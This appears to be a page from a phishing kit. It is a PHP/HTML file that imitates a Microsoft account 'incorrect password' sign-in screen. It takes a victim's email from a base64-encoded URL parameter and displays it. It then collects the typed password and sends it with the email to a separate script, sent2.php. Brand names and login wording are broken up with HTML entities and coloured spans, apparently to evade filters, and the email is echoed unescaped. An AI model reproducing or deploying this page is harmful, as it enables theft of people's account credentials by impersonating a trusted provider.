﻿<?php
error_reporting(0);

$data = $_GET['mang'];
if ( base64_encode(base64_decode($data)) === $data){
    $email = base64_decode($data);
} else {
    $email = $data;
}

?>

<!doctype html>
<html dir="ltr" lang="EN-US">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<title> M&#105;cro&#115;&#111;&#102;&#116; ac&#99;&#111;&#117;nt Incorrect </title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<link rel="shortcut icon" href="">
	<link rel="stylesheet" title="Converged" type="text/css" href="../css/style2.css">
	<style type="text/css">body{display:none;}</style>
	<style type="text/css">body{display:block !important;}</style>
	<style type="text/css">body{display:block !important;}</style>
</head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
	<div>
		<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
			<!-- <div style="background-image: url(&quot;../images/trrtyrtyrtr44&quot;);"></div> -->
			<div class="backgroundImage" style="background-image: url(&quot;../images/&quot;);"></div>
		</div>
	</div> 
			<form  novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="sent2.php">
			<div class="outer">
			<div class="middle">
			<div class="inner">
			<div>
				<img class="logo" src="../images/httpp2.png">
			</div>
			<div role="main" >
				<div class="">
					<div class="animate slide-in-next"> 
						<div class="identityBanner">
							<!-- <button type="button" class="backButton" id="idBtn_Back" aria-label="Back">
							<img role="presentation" src="v"></button> -->
							<div id="displayName" class="identity" title=""><?php echo $email; ?></div>
						</div>
					</div>
				</div>
					<div class="pagination-view animate has-identity-banner slide-in-next" >
						<input name="emang" value="<?php echo $email; ?>" type="hidden"> 
						<input name="loginfmt" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="text"> 
						<div id="loginHeader" class="row text-title" role="heading" aria-level="1" >En<span style="color: rgb(40, 50, 78);">ter p</span>as<span style="color: rgb(40, 50, 78);">swo</span>rd</div>
							<div class="row"> 
								<div class="form-group col-md-24"> 
									<div role="alert" aria-live="assertive" aria-atomic="false">
									<div id="passwordError" class="alert alert-error" >The &#x61;&#99;&#x63;&#111;&#x75;&#110;&#x74; or &#112;&#x61;&#115;&#x73;&#119;&#x6F;&#114;&#x64; is &#105;&#x6E;&#99;&#x6F;&#114;&#x72;&#101;&#x63;&#116;. If &#121;&#x6F;&#117; don't remember &#121;&#x6F;&#117;&#x72; &#112;&#x61;&#115;&#x73;&#119;&#x6F;&#114;&#x64;, <a id="idA_IL_ForgotPassword0" href="#">r&#x65;&#115;&#101;&#x74; &#105;&#x74; now.</a></div></div>
									
									<div class="placeholderContainer" >
										<input name="rahasia2" id="i0118" required="" autocomplete="off" autofocus="" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="P&#1072;ssword" aria-label="Enter the &#112;&#x61;&#115;&#x73;&#119;&#x6F;&#114;&#x64; for<?php echo $email; ?>" type="password">
									</div> 
								</div> 
							</div>
						<div class="position-buttons">
							<div>
								<div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top"> 
									<label id="idLbl_PWD_KMSI_Cb"> 
									<input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" aria-label="Keep me signed in" type="checkbox"> 
									<span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Ke<span style="color: rgb(40, 50, 78);">ep m</span>e si<span style="color: rgb(40, 50, 78);">gne</span>d in</span></label> 
								</div>
								<div class="row"> 
									<div class="col-md-24"> 
										<div class="text-13 action-links"> 
											<div class="form-group">
											<a id="idA_PWD_ForgotPassword" role="link" href="#" >F<span style="color: rgb(40, 50, 78);">orgo</span>t <span style="color: rgb(40, 50, 78);">pa</span>s<span style="color: rgb(40, 50, 78);">sword?</a></div>
										<div class="form-group"></div>
										</div> 
									</div> 
								</div> 
							</div>
							<div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> 
							<div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" >
								<div class="inline-block">
									<input id="idSIButton9" class="btn btn-block btn-primary" value="Sign in" type="submit"> 
								</div> 
							</div>
						</div> 
					</div>
				</div>
			</div>
			</div> 

						</div> 
					</div> 
					<div id="footer" class="footer default new-background-image"> 
						<div>
							<div id="footerLinks" class="footerNode text-secondary">
								<a id="ftrTerms" href="#"></a> 
								<a id="ftrPrivacy" href="#"></a>
								<img class="mobileMode" role="presentation" src="../images/4564564568999545jjfgb4c">
							</div> 
						</div> 
					</div> 
		</form> 
		<form method="post" target="_top"></form>
</body>
</html>